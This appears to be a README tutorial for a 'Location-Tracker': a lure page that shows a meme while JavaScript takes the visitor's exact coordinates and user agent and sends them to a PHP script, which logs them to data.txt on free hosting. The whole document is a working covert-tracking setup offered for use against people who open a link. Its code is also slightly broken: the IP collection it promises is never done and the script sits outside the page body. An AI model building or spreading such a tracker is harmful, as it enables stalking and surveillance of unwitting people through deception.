# Location-Tracker

This Method is used to Get the Location of the person exactly By using simple Html code.
Step 1: Create the HTML File

Open a text editor or code editor on your local machine.
Create a new HTML file and save it as locate.html.
Step 2: Add the Meme(random pic link) and JavaScript Code

Inside locate.html, add an <iframe> tag to display the meme:
Now when a user opens the link he will see that pic

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meme Page</title>
</head>
<body>
    <iframe src="URL_TO_YOUR_MEME_IMAGE" frameborder="0"></iframe>
</body>
</html>

Add JavaScript code to collect user location, user agent, and IP address. This can be done using the navigator object and making a request to an external PHP file for data collection.

<script>
    // Function to send data to the PHP file
    function sendData(location, userAgent, ipAddress) {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", `store.php?location=${location}&userAgent=${userAgent}&ipAddress=${ipAddress}`, true);
        xhr.send();
    }

    // Get user location using the Geolocation API
    navigator.geolocation.getCurrentPosition((position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const location = `Latitude: ${latitude}, Longitude: ${longitude}`;
        
        // Get user agent and IP address
        const userAgent = navigator.userAgent;
        
        // Send data to the PHP file
        sendData(location, userAgent, '');
    });
</script>

Step 3: Create the PHP File

Create a new file named store.php in the same directory as locate.html.

In store.php, you can collect the data sent from the JavaScript and store it in a file or database. For example:

<?php
if (isset($_GET['location']) && isset($_GET['userAgent'])) {
    $location = $_GET['location'];
    $userAgent = $_GET['userAgent'];
    
    // Store the data in a file (e.g., data.txt)
    $data = "Location: $location\nUser Agent: $userAgent\n";
    file_put_contents('data.txt', $data, FILE_APPEND);
}
?>

Step 4: Host the Files on 000webhost.com

Sign in to your 000webhost.com account.

Upload both locate.html and store.php to your hosting account using FTP or the web-based file manager provided by your hosting service.

Once the files are uploaded, you can access locate.html through a web browser using the hosted URL (e.g., https://yourwebsite.000webhostapp.com/locate.html).

Step 5: Testing

Open locate.html in your browser both locally (from your laptop) and through the hosted URL.

You should see the meme displayed, and the JavaScript code will collect and send data to store.php for both versions.

Check the data.txt file (or your chosen storage method) on your hosting account to verify that the data is being stored correctly.
